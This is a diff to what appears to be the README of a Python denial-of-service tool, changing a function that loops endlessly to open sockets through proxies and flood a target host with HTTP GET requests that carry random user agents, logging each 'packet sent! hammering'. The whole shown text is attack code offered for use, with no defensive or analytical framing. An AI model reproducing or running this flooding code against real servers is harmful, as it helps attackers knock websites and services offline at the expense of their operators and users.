@@ -52,25 +52,24 @@ But here i remake the attack method to fast attack.
 ```Python
 def down_it():
     try:
-        data = """
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Accept-Language: en-us,en;q=0.5
-        Accept-Encoding: gzip,deflate
-        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
-        Connection: keep-alive"""
+        data = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Connection: keep-alive"""
         while True:
             packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((prox[0],int(prox[1])))
-            if s.send( packet):
+            if s.sendto( packet, (host, int(port))):
                 s.shutdown(1)
-                print ("\033[92m","Time :","\033[0m","\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+                print ("\033[94m <--packet sent to {0}:{1}! hammering--> \033[0m".format(host, int(port)))
             else:
                 s.shutdown(1)
-                print("\033[91mshut<->down\033[0m")
+                print("\033[91m shut<->down\033[0m")
             time.sleep(.1)
     except socket.error as e:
-        print("\033[91mSocket error\033[0m")
+        print("\033[91m Socket error, Error {0}\033[0m".format(e))
         time.sleep(2)
     except KeyboardInterrupt:
         exit()
